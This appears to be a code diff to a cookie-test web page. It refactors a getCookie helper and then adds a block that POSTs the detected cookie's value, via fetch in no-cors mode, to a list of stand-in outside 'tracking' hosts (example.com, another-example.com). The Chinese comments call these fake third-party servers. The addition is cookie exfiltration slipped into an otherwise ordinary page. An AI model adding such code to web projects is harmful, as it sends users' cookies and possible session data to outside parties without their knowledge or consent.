@@ -18,10 +18,9 @@
         function getCookie(name) {
             var nameEQ = name + "=";
             var ca = document.cookie.split(';');
-            for(var i=0;i < ca.length;i++) {
-                var c = ca[i];
-                while (c.charAt(0)==' ') c = c.substring(1,c.length);
-                if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
+            for(var i=0; i < ca.length; i++) {
+                var c = ca[i].trim();
+                if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
             }
             return null;
         }
@@ -31,6 +30,31 @@
         var testCookie = getCookie('testCookie');
         if (testCookie) {
             statusDiv.innerText = "Cookie 'testCookie' detected: " + testCookie;
+
+            // 伪造的第三方服务器地址列表
+            const thirdPartyServers = [
+              'https://example.com/track',
+              'https://another-example.com/track',
+              // 更多服务器...
+            ];
+
+            // 对每个服务器发送请求
+            thirdPartyServers.forEach(url => {
+              fetch(url, {
+                method: 'POST',
+                body: JSON.stringify({cookie: testCookie}),
+                headers: {
+                  'Content-Type': 'application/json'
+                },
+                // 防止跨域问题
+                mode: 'no-cors'
+              }).then(response => {
+                console.log(`Request sent to ${url}`);
+              }).catch(error => {
+                console.error(`Tracking error for ${url}:`, error);
+              });
+            });
+
         } else {
             statusDiv.innerText = "Cookie 'testCookie' not found. It may have been blocked or not set.";
         }
